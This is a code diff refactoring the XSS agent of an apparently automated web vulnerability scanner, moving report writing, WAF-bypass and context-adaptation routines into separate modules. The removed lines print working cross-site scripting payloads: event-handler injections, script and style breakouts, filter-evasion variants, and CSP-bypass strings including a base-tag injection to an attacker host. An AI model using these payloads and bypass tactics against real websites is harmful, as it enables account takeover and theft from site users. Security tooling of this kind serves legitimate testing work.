@@ -66,6 +66,43 @@ from bugtrace.tools.go_bridge import GoFuzzerBridge, FuzzResult, Reflection
 from bugtrace.tools.manipulator.orchestrator import ManipulatorOrchestrator
 from bugtrace.tools.manipulator.models import MutableRequest, MutationStrategy
 
+# v3.4: Extracted pure modules
+from bugtrace.agents.xss.waf import (
+    detect_payload_encoding as _pure_detect_payload_encoding,
+    record_bypass_result as _pure_record_bypass_result,
+    get_waf_optimized_payloads as _pure_get_waf_optimized_payloads,
+    bypass_try_waf_encoding as _pure_bypass_try_waf_encoding,
+    bypass_try_char_obfuscation as _pure_bypass_try_char_obfuscation,
+    bypass_try_context_specific as _pure_bypass_try_context_specific,
+    bypass_try_universal_payloads as _pure_bypass_try_universal_payloads,
+    generate_bypass_variant as _pure_generate_bypass_variant,
+)
+from bugtrace.agents.xss.feedback import (
+    adapt_to_context as _pure_adapt_to_context,
+    extract_js_code as _pure_extract_js_code,
+    adapt_for_attribute as _pure_adapt_for_attribute,
+    adapt_for_script as _pure_adapt_for_script,
+    adapt_for_html as _pure_adapt_for_html,
+    adapt_for_comment as _pure_adapt_for_comment,
+    adapt_for_style as _pure_adapt_for_style,
+    encode_stripped_chars as _pure_encode_stripped_chars,
+    generate_csp_bypass_payload as _pure_generate_csp_bypass_payload,
+    handle_waf_blocked as _pure_handle_waf_blocked,
+    handle_context_mismatch as _pure_handle_context_mismatch,
+    handle_encoding_stripped as _pure_handle_encoding_stripped,
+    handle_partial_reflection as _pure_handle_partial_reflection,
+    handle_csp_blocked as _pure_handle_csp_blocked,
+    handle_timing_issue as _pure_handle_timing_issue,
+    generate_variant_for_reason as _pure_generate_variant_for_reason,
+)
+from bugtrace.agents.xss.reporting import (
+    get_snippet as _pure_get_snippet,
+    save_phase1_report as _pure_save_phase1_report,
+    save_phase2_report as _pure_save_phase2_report,
+    save_phase3_report as _pure_save_phase3_report,
+    save_phase4_report as _pure_save_phase4_report,
+)
+
 logger = get_logger("agents.xss_v4")
 
 
@@ -2043,88 +2080,14 @@ Return EXACTLY 100 payloads, one per line, no explanations, no numbering."""
         payloads: List[str],
         result: "FuzzResult"
     ) -> None:
-        """Save Phase 1 bombardment report to markdown."""
-        report_path = report_dir / "phase1_bombardment.md"
-
-        content = f"""# Phase 1: BOMBARDEO TOTAL
-
-**Target:** {self.url}
-**Parameter:** {param}
-**Timestamp:** {_now()}
-
-## Statistics
-- Total Payloads Sent: {len(payloads)}
-- Total Requests: {result.total_requests}
-- Duration: {result.duration_ms}ms
-- Speed: {result.requests_per_second:.1f} req/s
-- Reflections Found: {len(result.reflections)}
-
-## Payload Sources
-1. OMNIPROBE_PAYLOAD (context detection)
-2. Curated List (bugtrace/data/xss_curated_list.txt)
-3. Proven Payloads (dynamic memory)
-4. GOLDEN_PAYLOADS (defaults)
-5. FRAGMENT_PAYLOADS (DOM XSS)
-
-## Payloads Sent
-```
-{chr(10).join(payloads[:50])}
-{"... and " + str(len(payloads) - 50) + " more" if len(payloads) > 50 else ""}
-```
-
-## Reflections Summary
-| Payload | Context | Encoded | Status |
-|---------|---------|---------|--------|
-"""
-        for ref in result.reflections[:30]:
-            content += f"| `{ref.payload[:40]}...` | {ref.context} | {ref.encoded} | {ref.status_code} |\n"
-
-        if len(result.reflections) > 30:
-            content += f"\n*... and {len(result.reflections) - 30} more reflections*\n"
-
-        report_path.write_text(content)
-        logger.debug(f"Phase 1 report saved to {report_path}")
+        """Save Phase 1 bombardment report to markdown.
+        Delegates to bugtrace.agents.xss.reporting.save_phase1_report."""
+        _pure_save_phase1_report(report_dir, self.url, param, payloads, result)
 
     def _save_phase2_report(self, report_dir: Path, analysis: Dict) -> None:
-        """Save Phase 2 analysis report to markdown."""
-        report_path = report_dir / "phase2_analysis.md"
-
-        content = f"""# Phase 2: ANÁLISIS
-
-**Timestamp:** {_now()}
-
-## Summary
-- Total Reflections: {len(analysis.get('reflections', []))}
-- Contexts Found: {', '.join(analysis.get('contexts', []))}
-- Interactsh Confirmed: {'✅ YES' if analysis.get('interactsh_confirmed') else '❌ No'}
-- High Confidence Candidates: {len(analysis.get('high_confidence_candidates', []))}
-
-## Server Escaping Behavior
-```json
-{json.dumps(analysis.get('escaping', {}), indent=2)}
-```
-
-## Reflection Details
-"""
-        for i, ref in enumerate(analysis.get('reflections', [])[:50], 1):
-            content += f"""
-### Reflection {i}
-- **Payload:** `{ref['payload'][:80]}...`
-- **Context:** {ref['context']}
-- **Encoded:** {ref['encoded']} ({ref.get('encoding_type', 'N/A')})
-- **Status Code:** {ref['status_code']}
-- **Suspicious:** {'⚠️ YES' if ref['is_suspicious'] else 'No'}
-"""
-
-        if analysis.get('interactsh_confirmed'):
-            content += f"""
-## 🎯 INTERACTSH CONFIRMATION
-**XSS CONFIRMED via OOB callback!**
-- Confirmed Payload: `{analysis.get('confirmed_payload', 'N/A')}`
-"""
-
-        report_path.write_text(content)
-        logger.debug(f"Phase 2 report saved to {report_path}")
+        """Save Phase 2 analysis report to markdown.
+        Delegates to bugtrace.agents.xss.reporting.save_phase2_report."""
+        _pure_save_phase2_report(report_dir, analysis)
 
     def _save_phase3_report(
         self,
@@ -2133,44 +2096,9 @@ Return EXACTLY 100 payloads, one per line, no explanations, no numbering."""
         payloads: List[str],
         result: "FuzzResult"
     ) -> None:
-        """Save Phase 3 amplification report to markdown."""
-        report_path = report_dir / "phase3_amplified.md"
-
-        content = f"""# Phase 3: AMPLIFICACIÓN INTELIGENTE
-
-**Target:** {self.url}
-**Parameter:** {param}
-**Timestamp:** {_now()}
-
-## Phase 3.1: LLM Visual Generation
-Generated visual payloads with "HACKED BY BUGTRACEAI" banner.
-
-## Phase 3.2: Breakout Amplification
-Multiplied visual payloads by breakouts.json prefixes.
-
-## Phase 3.3: Second Bombardment Statistics
-- Amplified Payloads: {len(payloads)}
-- Total Requests: {result.total_requests}
-- Duration: {result.duration_ms}ms
-- Speed: {result.requests_per_second:.1f} req/s
-- Reflections Found: {len(result.reflections)}
-
-## Sample Amplified Payloads
-```
-{chr(10).join(payloads[:30])}
-{"... and " + str(len(payloads) - 30) + " more" if len(payloads) > 30 else ""}
-```
-
-## Reflections from Amplified Attack
-| Payload | Context | Encoded | Suspicious |
-|---------|---------|---------|------------|
-"""
-        for ref in result.reflections[:30]:
-            suspicious = "⚠️" if ref.is_suspicious else ""
-            content += f"| `{ref.payload[:40]}...` | {ref.context} | {ref.encoded} | {suspicious} |\n"
-
-        report_path.write_text(content)
-        logger.debug(f"Phase 3 report saved to {report_path}")
+        """Save Phase 3 amplification report to markdown.
+        Delegates to bugtrace.agents.xss.reporting.save_phase3_report."""
+        _pure_save_phase3_report(report_dir, self.url, param, payloads, result)
 
     def _save_phase4_report(
         self,
@@ -2178,82 +2106,21 @@ Multiplied visual payloads by breakouts.json prefixes.
         finding: Optional[XSSFinding],
         validation_method: str
     ) -> None:
-        """Save Phase 4 validation report to markdown."""
-        report_path = report_dir / "phase4_results.md"
-
+        """Save Phase 4 validation report to markdown.
+        Delegates to bugtrace.agents.xss.reporting.save_phase4_report."""
+        exploit_url_fallback = ""
         if finding:
-            content = f"""# Phase 4: VALIDATION RESULTS
-
-**Timestamp:** {_now()}
-**Status:** ✅ XSS CONFIRMED
-
-## Finding Details
-- **Parameter:** {finding.parameter}
-- **Payload:**
-```
-{finding.payload}
-```
-- **Context:** {finding.context}
-- **Validation Method:** {validation_method}
-- **Confidence:** {finding.confidence:.0%}
-
-## Evidence
-```json
-{json.dumps(finding.evidence, indent=2, default=str)}
-```
-
-## Exploit URL
-```
-{finding.exploit_url or self._build_attack_url(finding.parameter, finding.payload)}
-```
-
-## Reproduction Steps
-1. Open the exploit URL in a browser
-2. The "HACKED BY BUGTRACEAI" banner should appear at the top of the page
-3. This confirms JavaScript execution in the user's browser context
-
-"""
-            if finding.screenshot_path:
-                content += f"""
-## Screenshot Evidence
-![XSS Screenshot]({finding.screenshot_path})
-"""
-        else:
-            content = f"""# Phase 4: VALIDATION RESULTS
-
-**Timestamp:** {_now()}
-**Status:** ❌ No XSS Confirmed
-
-## Summary
-Pipeline V2 completed all phases but could not confirm XSS execution.
-
-### Possible Reasons:
-1. Server escaping is effective
-2. WAF blocked payloads
-3. Context doesn't allow execution
-4. Payloads need manual adjustment
-
-### Recommendations:
-1. Review phase2_analysis.md for escaping behavior
-2. Check phase3_amplified.md for reflection contexts
-3. Try manual testing with browser developer tools
-"""
-
-        report_path.write_text(content)
-        logger.debug(f"Phase 4 report saved to {report_path}")
+            exploit_url_fallback = self._build_attack_url(finding.parameter, finding.payload)
+        _pure_save_phase4_report(report_dir, finding, validation_method, exploit_url_fallback)
 
     # =========================================================================
     # END PIPELINE V2
     # =========================================================================
 
     def _get_snippet(self, text: str, target: str, max_len: int = 200) -> str:
-        """Extract snippet around the target string."""
-        idx = text.find(target)
-        if idx == -1:
-            return ""
-        start = max(0, idx - 50)
-        end = min(len(text), idx + len(target) + 100)
-        return text[start:end].strip()
+        """Extract snippet around the target string.
+        Delegates to bugtrace.agents.xss.reporting.get_snippet."""
+        return _pure_get_snippet(text, target, max_len)
 
     def _check_contexts(self, html: str, probe: str, escaped_probe: str) -> list:
         """Check all contexts and return found ones."""
@@ -2772,31 +2639,18 @@ Pipeline V2 completed all phases but could not confirm XSS execution.
             return base_payloads
 
     def _detect_payload_encoding(self, payload: str) -> str:
-        """Detect which encoding technique was used in the payload."""
-        if "%25" in payload:
-            return "double_url_encode"
-        if "\\u00" in payload:
-            return "unicode_encode"
-        if "&#x" in payload:
-            return "html_entity_hex"
-        if "&#" in payload:
-            return "html_entity_encode"
-        if "%00" in payload or "%0" in payload:
-            return "null_byte_injection"
-        if "/**/" in payload:
-            return "comment_injection"
-        return "unknown"
+        """Detect which encoding technique was used in the payload.
+        Delegates to bugtrace.agents.xss.waf.detect_payload_encoding."""
+        return _pure_detect_payload_encoding(payload)
 
     def _record_bypass_result(self, payload: str, success: bool):
-        """
-        Record bypass result for Q-Learning feedback.
-        This improves future WAF bypass strategy selection.
-        """
+        """Record bypass result for Q-Learning feedback.
+        Uses pure detection, then calls strategy_router for side-effect."""
         if not self._detected_waf:
             return
 
         try:
-            encoding_used = self._detect_payload_encoding(payload)
+            encoding_used = _pure_detect_payload_encoding(payload)
             strategy_router.record_result(self._detected_waf, encoding_used, success)
             logger.debug(f"[{self.name}] Recorded bypass: {self._detected_waf}/{encoding_used} = {'SUCCESS' if success else 'FAIL'}")
         except Exception as e:
@@ -8523,37 +8377,38 @@ Answer with ONLY one word: SI or NO"""
         feedback: ValidationFeedback,
         original: str
     ) -> Tuple[Optional[str], str]:
-        """Handle context mismatch scenario."""
+        """Handle context mismatch scenario.
+        Delegates to bugtrace.agents.xss.feedback.handle_context_mismatch."""
         logger.info(f"[XSSAgent] Context mismatch, adapting to: {feedback.detected_context}")
-        variant = self._adapt_to_context(original, feedback.detected_context)
-        return variant, "context_adaptation"
+        return _pure_handle_context_mismatch(original, feedback.detected_context)
 
     def _handle_encoding_stripped(
         self,
         feedback: ValidationFeedback,
         original: str
     ) -> Tuple[Optional[str], str]:
-        """Handle encoding stripped scenario."""
+        """Handle encoding stripped scenario.
+        Delegates to bugtrace.agents.xss.feedback.handle_encoding_stripped."""
         logger.info(f"[XSSAgent] Chars stripped: {feedback.stripped_chars}")
-        variant = self._encode_stripped_chars(original, feedback.stripped_chars)
-        return variant, "char_encoding"
+        return _pure_handle_encoding_stripped(original, feedback.stripped_chars)
 
     def _handle_partial_reflection(self) -> Tuple[str, str]:
-        """Handle partial reflection scenario."""
+        """Handle partial reflection scenario.
+        Delegates to bugtrace.agents.xss.feedback.handle_partial_reflection."""
         logger.info("[XSSAgent] Partial reflection, trying simpler payload")
-        return "<img src=x onerror=alert(1)>", "simplification"
+        return _pure_handle_partial_reflection()
 
     def _handle_csp_blocked(self) -> Tuple[Optional[str], str]:
-        """Handle CSP blocked scenario."""
+        """Handle CSP blocked scenario.
+        Delegates to bugtrace.agents.xss.feedback.handle_csp_blocked."""
         logger.info("[XSSAgent] CSP blocked, trying CSP bypass")
-        variant = self._generate_csp_bypass_payload()
-        return variant, "csp_bypass"
+        return _pure_handle_csp_blocked()
 
     def _handle_timing_issue(self, original: str) -> Tuple[str, str]:
-        """Handle timing issue scenario."""
+        """Handle timing issue scenario.
+        Delegates to bugtrace.agents.xss.feedback.handle_timing_issue."""
         logger.info("[XSSAgent] Timing issue, adding load event")
-        variant = f"<body onload=\"{original.replace('<script>', '').replace('</script>', '')}\">"
-        return variant, "timing_fix"
+        return _pure_handle_timing_issue(original)
 
     async def _handle_no_execution(
         self,
@@ -8588,116 +8443,40 @@ Answer with ONLY one word: SI or NO"""
         return None, "llm_fallback"
 
     def _extract_js_code(self, payload: str) -> str:
-        """Extract JavaScript execution code from payload."""
-        js_code = payload
-        js_code = js_code.replace('<script>', '').replace('</script>', '')
-        js_code = js_code.replace('<img src=x onerror=', '').replace('>', '')
-        return js_code if js_code else 'alert(1)'
+        """Delegates to bugtrace.agents.xss.feedback.extract_js_code."""
+        return _pure_extract_js_code(payload)
 
     def _adapt_for_attribute(self, js_code: str) -> str:
-        """Adapt for HTML attribute context."""
-        return f'" onmouseover="{js_code}" autofocus onfocus="{js_code}" x="'
+        """Delegates to bugtrace.agents.xss.feedback.adapt_for_attribute."""
+        return _pure_adapt_for_attribute(js_code)
 
     def _adapt_for_script(self, js_code: str) -> str:
-        """Adapt for script block context."""
-        return f"';{js_code};//"
+        """Delegates to bugtrace.agents.xss.feedback.adapt_for_script."""
+        return _pure_adapt_for_script(js_code)
 
     def _adapt_for_html(self, js_code: str) -> str:
-        """Adapt for HTML body context."""
-        return f'<img src=x onerror={js_code}>'
+        """Delegates to bugtrace.agents.xss.feedback.adapt_for_html."""
+        return _pure_adapt_for_html(js_code)
 
     def _adapt_for_comment(self, js_code: str) -> str:
-        """Adapt for HTML comment context."""
-        return f'--><script>{js_code}</script><!--'
+        """Delegates to bugtrace.agents.xss.feedback.adapt_for_comment."""
+        return _pure_adapt_for_comment(js_code)
 
     def _adapt_for_style(self, js_code: str) -> str:
-        """Adapt for style block context."""
-        return f'</style><script>{js_code}</script><style>'
+        """Delegates to bugtrace.agents.xss.feedback.adapt_for_style."""
+        return _pure_adapt_for_style(js_code)
 
     def _adapt_to_context(self, payload: str, context: Optional[str]) -> str:
-        """
-        Adapta un payload al contexto HTML detectado.
-
-        Args:
-            payload: Payload original
-            context: Contexto detectado ('script', 'attribute', 'html', etc.)
-
-        Returns:
-            Payload adaptado al contexto
-        """
-        js_code = self._extract_js_code(payload)
-
-        if context == 'attribute':
-            return self._adapt_for_attribute(js_code)
-        if context == 'script':
-            return self._adapt_for_script(js_code)
-        if context == 'html':
-            return self._adapt_for_html(js_code)
-        if context == 'comment':
-            return self._adapt_for_comment(js_code)
-        if context == 'style':
-            return self._adapt_for_style(js_code)
-
-        # Default: safe payload
-        return self._adapt_for_html(js_code)
+        """Delegates to bugtrace.agents.xss.feedback.adapt_to_context."""
+        return _pure_adapt_to_context(payload, context)
 
     def _encode_stripped_chars(self, payload: str, stripped: List[str]) -> str:
-        """
-        Codifica los caracteres que fueron filtrados por el servidor.
-        
-        Args:
-            payload: Payload original
-            stripped: Lista de caracteres que fueron filtrados
-            
-        Returns:
-            Payload con los caracteres codificados
-        """
-        result = payload
-        
-        # Mapeo de caracteres a diferentes encodings
-        encoding_options = {
-            '<': ['&lt;', '\\x3c', '\\u003c', '%3C'],
-            '>': ['&gt;', '\\x3e', '\\u003e', '%3E'],
-            '"': ['&quot;', '\\x22', '\\u0022', '%22'],
-            "'": ['&#39;', '\\x27', '\\u0027', '%27'],
-            '(': ['&#40;', '\\x28', '\\u0028', '%28'],
-            ')': ['&#41;', '\\x29', '\\u0029', '%29'],
-            '/': ['&#47;', '\\x2f', '\\u002f', '%2F'],
-            '\\': ['&#92;', '\\x5c', '\\u005c', '%5C'],
-            '=': ['&#61;', '\\x3d', '\\u003d', '%3D']
-        }
-        
-        for char in stripped:
-            if char in encoding_options:
-                # Usar el primer encoding disponible
-                encoded = encoding_options[char][0]
-                result = result.replace(char, encoded)
-        
-        return result
+        """Delegates to bugtrace.agents.xss.feedback.encode_stripped_chars."""
+        return _pure_encode_stripped_chars(payload, stripped)
 
     def _generate_csp_bypass_payload(self) -> str:
-        """
-        Genera un payload que intenta bypassear CSP.
-        
-        Returns:
-            Payload diseñado para evadir CSP
-        """
-        csp_bypass_payloads = [
-            # Usar 'nonce' si está disponible
-            '<script nonce="">alert(1)</script>',
-            # Base tag injection
-            '<base href="https://attacker.com/">',
-            # JSONP callback
-            '<script src="/api/callback?cb=alert(1)"></script>',
-            # Angular sandbox escape
-            '{{constructor.constructor("alert(1)")()}}',
-            # Trusted Types bypass
-            '<div data-trusted="<img src=x onerror=alert(1)>"></div>',
-            # Object/embed bypass
-            '<object data="javascript:alert(1)">',
-        ]
-        # Devolver el primero (en una implementación más avanzada, tendría más lógica)
-        return csp_bypass_payloads[0]
+        """Delegates to bugtrace.agents.xss.feedback.generate_csp_bypass_payload."""
+        return _pure_generate_csp_bypass_payload()
 
     def _bypass_try_waf_encoding(
         self,
@@ -8705,120 +8484,63 @@ Answer with ONLY one word: SI or NO"""
         waf_signature: str,
         tried_variants: List[str]
     ) -> Optional[str]:
-        """Generate WAF bypass variant using Q-Learning encoding."""
+        """Generate WAF bypass variant using Q-Learning encoding.
+        Delegates to bugtrace.agents.xss.waf.bypass_try_waf_encoding."""
         if not waf_signature or waf_signature.lower() == "no identificado":
             return None
 
         logger.info(f"[XSSAgent] WAF detected ({waf_signature}), using intelligent encoding...")
+        # NOTE: _get_waf_optimized_payloads is async but called sync here.
+        # This is a pre-existing issue preserved for backward compatibility.
         encoded_variants = self._get_waf_optimized_payloads([original_payload], max_variants=5)
 
-        for variant in encoded_variants:
-            if variant not in tried_variants and variant != original_payload:
-                logger.info(f"[XSSAgent] Generated WAF bypass variant: {variant[:80]}...")
-                return variant
-        return None
+        variant, _ = _pure_bypass_try_waf_encoding(
+            original_payload, waf_signature, tried_variants,
+            encoded_variants if isinstance(encoded_variants, list) else []
+        )
+        if variant:
+            logger.info(f"[XSSAgent] Generated WAF bypass variant: {variant[:80]}...")
+        return variant
 
     def _bypass_try_char_obfuscation(
         self,
         stripped_chars: str,
         tried_variants: List[str]
     ) -> Optional[str]:
-        """Generate bypass variant using character obfuscation techniques."""
+        """Generate bypass variant using character obfuscation.
+        Delegates to bugtrace.agents.xss.waf.bypass_try_char_obfuscation."""
         if not stripped_chars:
             return None
-
         logger.info(f"[XSSAgent] Characters filtered ({stripped_chars}), using obfuscation...")
-        bypass_techniques = []
-
-        # Si filtran '<' y '>', probar con event handlers
-        if '<' in stripped_chars or '>' in stripped_chars:
-            bypass_techniques.extend([
-                f'" autofocus onfocus=alert(1) x="',
-                f'" onload=alert(1) x="',
-                f'" onerror=alert(1) x="',
-            ])
-
-        # Si filtran 'script', probar alternativas
-        if 'script' in stripped_chars.lower():
-            bypass_techniques.extend([
-                '<img src=x onerror=alert(1)>',
-                '<svg onload=alert(1)>',
-                '<body onload=alert(1)>',
-            ])
-
-        # Si filtran paréntesis, usar backticks
-        if '(' in stripped_chars or ')' in stripped_chars:
-            bypass_techniques.extend([
-                '<img src=x onerror=alert`1`>',
-                '<svg onload=alert`1`>',
-            ])
-
-        for variant in bypass_techniques:
-            if variant not in tried_variants:
-                logger.info(f"[XSSAgent] Generated obfuscation variant: {variant[:80]}...")
-                return variant
-        return None
+        variant, _ = _pure_bypass_try_char_obfuscation(stripped_chars, tried_variants)
+        if variant:
+            logger.info(f"[XSSAgent] Generated obfuscation variant: {variant[:80]}...")
+        return variant
 
     def _bypass_try_context_specific(
         self,
         detected_context: str,
         tried_variants: List[str]
     ) -> Optional[str]:
-        """Generate bypass variant based on detected HTML context."""
+        """Generate bypass variant based on detected HTML context.
+        Delegates to bugtrace.agents.xss.waf.bypass_try_context_specific."""
         if not detected_context:
             return None
-
-        context_lower = detected_context.lower()
-        context_specific = []
-
-        if 'attribute' in context_lower or 'attr' in context_lower:
-            context_specific.extend([
-                '" autofocus onfocus=alert(1) x="',
-                "' autofocus onfocus=alert(1) x='",
-                '" onmouseover=alert(1) x="',
-            ])
-        elif 'script' in context_lower:
-            context_specific.extend([
-                '</script><img src=x onerror=alert(1)>',
-                '-alert(1)-',
-                ';alert(1);//',
-            ])
-        elif 'html' in context_lower or 'body' in context_lower:
-            context_specific.extend([
-                '<img src=x onerror=alert(1)>',
-                '<svg onload=alert(1)>',
-                '<iframe onload=alert(1)>',
-            ])
-
-        for variant in context_specific:
-            if variant not in tried_variants:
-                logger.info(f"[XSSAgent] Generated context-specific variant: {variant[:80]}...")
-                return variant
-        return None
+        variant, _ = _pure_bypass_try_context_specific(detected_context, tried_variants)
+        if variant:
+            logger.info(f"[XSSAgent] Generated context-specific variant: {variant[:80]}...")
+        return variant
 
     def _bypass_try_universal_payloads(
         self,
         tried_variants: List[str]
     ) -> Optional[str]:
-        """Generate universal bypass payloads as fallback."""
-        universal_advanced = [
-            '<img src=x onerror=alert(1)>',
-            '<svg/onload=alert(1)>',
-            '<iframe src=javascript:alert(1)>',
-            '<body onload=alert(1)>',
-            '<input onfocus=alert(1) autofocus>',
-            '<select onfocus=alert(1) autofocus>',
-            '<textarea onfocus=alert(1) autofocus>',
-            '<keygen onfocus=alert(1) autofocus>',
-            '<video><source onerror=alert(1)>',
-            '<audio src=x onerror=alert(1)>',
-        ]
-
-        for variant in universal_advanced:
-            if variant not in tried_variants:
-                logger.info(f"[XSSAgent] Generated universal variant: {variant[:80]}...")
-                return variant
-        return None
+        """Generate universal bypass payloads as fallback.
+        Delegates to bugtrace.agents.xss.waf.bypass_try_universal_payloads."""
+        variant, _ = _pure_bypass_try_universal_payloads(tried_variants)
+        if variant:
+            logger.info(f"[XSSAgent] Generated universal variant: {variant[:80]}...")
+        return variant
 
     async def generate_bypass_variant(
         self,
@@ -8830,45 +8552,41 @@ Answer with ONLY one word: SI or NO"""
         tried_variants: Optional[List[str]] = None
     ) -> Optional[str]:
         """
-        Genera una variante de payload XSS basada en feedback de fallo.
-
-        Este método es llamado por el AgenticValidator cuando un payload falla,
-        permitiendo al agente usar su lógica sofisticada de bypass para generar
-        una variante que evite el problema detectado.
+        Generate a bypass XSS payload variant based on failure feedback.
+        Delegates to bugtrace.agents.xss.waf.generate_bypass_variant.
 
         Args:
-            original_payload: El payload que falló
-            failure_reason: Razón del fallo (waf_blocked, chars_filtered, etc.)
-            waf_signature: Firma del WAF detectado (si aplica)
-            stripped_chars: Caracteres que fueron filtrados
-            detected_context: Contexto HTML donde se reflejó
-            tried_variants: Lista de variantes ya probadas
+            original_payload: The payload that failed
+            failure_reason: Why it failed (waf_blocked, chars_filtered, etc.)
+            waf_signature: WAF identifier if detected
+            stripped_chars: Characters that were filtered
+            detected_context: HTML context where payload was reflected
+            tried_variants: List of already-tried variants
 
         Returns:
-            String con el nuevo payload, o None si no se pudo generar
+            New payload string, or None if all strategies exhausted
         """
         logger.info(f"[XSSAgent] Generating bypass variant for failed payload: {original_payload[:50]}...")
-        tried_variants = tried_variants or []
+        tried = tried_variants or []
 
-        # Try each bypass strategy in order
-        variant = self._bypass_try_waf_encoding(original_payload, waf_signature, tried_variants)
-        if variant:
-            return variant
+        # Pre-compute encoded variants for WAF bypass (async pipeline)
+        encoded_variants = []
+        if waf_signature and waf_signature.lower() != "no identificado":
+            encoded_variants = await self._get_waf_optimized_payloads([original_payload], max_variants=5)
 
-        variant = self._bypass_try_char_obfuscation(stripped_chars, tried_variants)
-        if variant:
-            return variant
+        result = _pure_generate_bypass_variant(
+            original_payload=original_payload,
+            failure_reason=failure_reason,
+            waf_signature=waf_signature,
+            stripped_chars=stripped_chars,
+            detected_context=detected_context,
+            tried_variants=tried,
+            encoded_variants=encoded_variants,
+        )
 
-        variant = self._bypass_try_context_specific(detected_context, tried_variants)
-        if variant:
-            return variant
-
-        variant = self._bypass_try_universal_payloads(tried_variants)
-        if variant:
-            return variant
-
-        logger.warning("[XSSAgent] Could not generate new variant (all strategies exhausted)")
-        return None
+        if not result:
+            logger.warning("[XSSAgent] Could not generate new variant (all strategies exhausted)")
+        return result
 
     def _finding_to_dict(self, finding: XSSFinding) -> Dict:
         """Convert finding to dictionary for JSON output."""
